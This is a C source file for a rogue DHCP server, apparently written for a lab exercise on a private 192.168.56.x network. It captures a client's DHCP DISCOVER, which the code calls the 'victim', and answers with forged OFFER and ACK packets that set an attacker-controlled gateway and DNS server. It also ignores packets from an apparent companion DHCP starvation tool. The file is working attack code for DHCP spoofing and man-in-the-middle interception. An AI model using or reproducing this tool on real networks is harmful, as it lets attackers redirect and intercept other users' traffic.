#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <netinet/in.h>

#include "DHCPfake.h"


int debug = 1;


char fake_offer_ip[] = "192.168.56.100"; // IP address offered to victim
char fake_server_ip[] = "192.168.56.1"; // Fake DHCP server address
char fake_gateway[] = "192.168.56.1"; // Default gateway given to victim
char fake_dns[] = "192.168.56.1"; // DNS server given to victim

char fake_dhcp_ip[] = "10.0.2.15";

/*
storage for the DHCP DISCOVER packet.

we need info because 
DHCP offer needs the same transaction ID and correct victim MAC address
DHCP request will be checked against this client later
*/

struct dhcp_packet victim_packet;


int create_socket(void){
    int sockfd;
    // UDP socket, reused address, send/receive broadcast packets
    sockfd = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);


    if(sockfd < 0){
        perror("socket");
        exit(1);
    }

    int enable = 1;

    // allows multiple processes to bind the same address, for testing
    setsockopt(sockfd, SOL_SOCKET, SO_REUSEADDR, &enable,sizeof(enable));
    // broadcast
    setsockopt(sockfd, SOL_SOCKET, SO_BROADCAST, &enable, sizeof(enable));

    struct sockaddr_in addr;
    memset(&addr,0,sizeof(addr));
    addr.sin_family = AF_INET;


    //DHCP server listens on port 67
    addr.sin_port = htons(DHCP_SERVER_PORT);
    // lsiten on all local interfaces
    addr.sin_addr.s_addr = INADDR_ANY;
    // socket to port 67, incoming DHCP broadcasts will arrive here
    if(bind(sockfd, (struct sockaddr *)&addr, sizeof(addr)) < 0){
        perror("bind");
        exit(1);
    }

    return sockfd;
}

int receive_discover(int sockfd){
    struct sockaddr_in client;
    socklen_t len = sizeof(client);

    while(1){
        struct dhcp_packet packet;
        memset(&packet,0,sizeof(packet));
        // source address in client
        recvfrom(sockfd, &packet, sizeof(packet), 0, (struct sockaddr *)&client, &len);

        // 1 = DISCOVER
        if(packet.options[6] != DHCP_DISCOVER)
            continue;

        // ignore starvation packets
        if(packet.chaddr[0]==0xAA && packet.chaddr[1]==0xAA){
            continue;
        }


        // vicitm info 
        memcpy(&victim_packet, &packet, sizeof(packet));
        if(debug)
            print_packet(packet);
        return 0;
    }

}

// Sends DHCP offer, ip address for my own 
int send_offer(int sockfd){
    struct dhcp_packet offer;
    create_dhcp_reply(&offer,DHCP_OFFER);
    struct sockaddr_in broadcast;

    memset(&broadcast,0,sizeof(broadcast));
    broadcast.sin_family = AF_INET;
    broadcast.sin_port = htons(DHCP_CLIENT_PORT);

    // Broadcast because the client does not have an IP yet
    broadcast.sin_addr.s_addr = INADDR_BROADCAST;

    sendto(sockfd, &offer, sizeof(offer), 0, (struct sockaddr *)&broadcast, sizeof(broadcast));

    return 0;
}


int receive_request(int sockfd){
    struct dhcp_packet request;

    while(1){
        recvfrom(sockfd, &request, sizeof(request), 0, NULL, NULL);
        if(request.options[6] != DHCP_REQUEST){
            continue;
        }
            

    // check mac, if request is for us
        if(memcmp(request.chaddr, victim_packet.chaddr, 6)==0){
            if(debug)
                print_packet(request);
            return 0;
        }
    }
}

int send_ack(int sockfd){
    struct dhcp_packet ack;
    create_dhcp_reply(&ack, DHCP_ACK);

    struct sockaddr_in broadcast;
    memset(&broadcast,0,sizeof(broadcast));

    broadcast.sin_family = AF_INET;
    broadcast.sin_port = htons(DHCP_CLIENT_PORT);
    broadcast.sin_addr.s_addr = INADDR_BROADCAST;

    sendto(sockfd, &ack, sizeof(ack), 0, (struct sockaddr *)&broadcast, sizeof(broadcast));


    return 0;
}


/*
creates DHCP offer or ACK packet
DHCP_OFFER = 2
DHCP_ACK   = 5
*/

// https://datatracker.ietf.org/doc/html/rfc2132
void create_dhcp_reply(struct dhcp_packet *packet, int type){
    memset(packet,0,sizeof(*packet));

    // copy of tranaction info of victim
    memcpy(packet, &victim_packet, sizeof(*packet));
    packet->op = 2;   // BOOTREPLY

    inet_pton(AF_INET, fake_offer_ip, &packet->yiaddr);

    inet_pton(AF_INET, fake_server_ip, &packet->siaddr);

    memset(packet->options, 0, sizeof(packet->options));

    // DHCP magic cookie
    packet->options[0]=0x63;
    packet->options[1]=0x82;
    packet->options[2]=0x53;
    packet->options[3]=0x63;


    int opt = 4;
     packet->options[opt++] = 54;
    packet->options[opt++] = 4;


    struct in_addr server_addr;

    inet_pton(AF_INET, fake_server_ip, &server_addr);

    memcpy(&packet->options[opt], &server_addr, 4);

    // DHCP Message Type (option 53)
    packet->options[10] = 53;
    packet->options[11] = 1;
    packet->options[12] = type;


    // Subnet Mask (Option 1)
    packet->options[13] = 1;
    packet->options[14] = 4;

    packet->options[15] = 255;
    packet->options[16] = 255;
    packet->options[17] = 255;
    packet->options[18] = 0;



    // Router / Default Gateway (option 3)
    packet->options[19] = 3;
    packet->options[20] = 4;

    struct in_addr gateway_addr;
    inet_pton(AF_INET, fake_gateway, &gateway_addr);

    memcpy(&packet->options[21], &gateway_addr, 4);

    // DNS Server (option 6)
    packet->options[25] = 6;
    packet->options[26] = 4;

    struct in_addr dns_addr;
    inet_pton(AF_INET, fake_dns, &dns_addr);

    memcpy(&packet->options[27], &dns_addr, 4);

    // lease Time (option 51)
    packet->options[31] = 51;
    packet->options[32] = 4;

    uint32_t lease_time = htonl(86400);

    memcpy(&packet->options[33], &lease_time, 4);



    // end of options
    packet->options[37] = 255;
}

// for debug
void print_packet(const struct dhcp_packet packet){
    printf("\nDHCP PACKET \n");
    printf("OP: %d\n",
           packet.op);
    printf("Hardware type: %d\n",
           packet.htype);
    printf("Hardware length: %d\n",
           packet.hlen);
    printf("Transaction ID: %u\n",
           ntohl(packet.xid));
    printf("IP: %s\n",
        inet_ntoa(packet.yiaddr));
    printf("Client MAC: ");
    for(int i=0;i<packet.hlen;i++)
    {
        printf("%02X ",
               packet.chaddr[i]);
    }
    printf("\n");
    printf("DHCP message type: %d\n",
           packet.options[6]);
    printf("\n");

}




int main(void){
    printf("Fake DHCP servert start\n");
    int sockfd = create_socket();
    printf("Waiting for DHCP Discover\n");
    receive_discover(sockfd);
    printf("Sending DHCP Offer\n");
    send_offer(sockfd);
    printf("Waiting for DHCP Request\n");
    receive_request(sockfd);
    printf("Sending DHCP ACK\n");
    send_ack(sockfd);
    close(sockfd);

    return 0;
}